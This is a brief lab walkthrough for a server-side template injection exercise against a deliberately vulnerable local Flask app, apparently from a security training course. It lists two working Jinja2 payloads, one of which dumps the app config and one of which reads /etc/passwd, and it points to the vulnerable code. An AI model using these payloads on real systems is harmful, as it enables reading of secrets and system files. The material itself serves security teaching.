## Server-Side Template Injection
* Open the **Terminal** on your Desktop
* Run the command `stop_all_containers.sh`
* Now run the command `start_flask.sh`, which will start a new container
* Open the Chrome Browser and navigate to a non-existent path:
	* `http://localhost:5050/non_existent_path`
* Substitute the `non_existent_path` with one of the payloads below.
* Payloads:
	* `{{ config.items() }}`
	* `{{''.__class__.mro()[2].__subclasses__()[40]('/etc/passwd').read()}}`

### Vulnerable Code - Template Injection
* Open Terminal
* Command: `cd /home/we45/Downloads/sources/Vulnerable-Flask-App`
* Command: `mousepad app/app.py`
* Mousepad opens up
	* goto line 101 and look for the vulnerable Template Call

### Stop App
* Run `stop_all_containers.sh`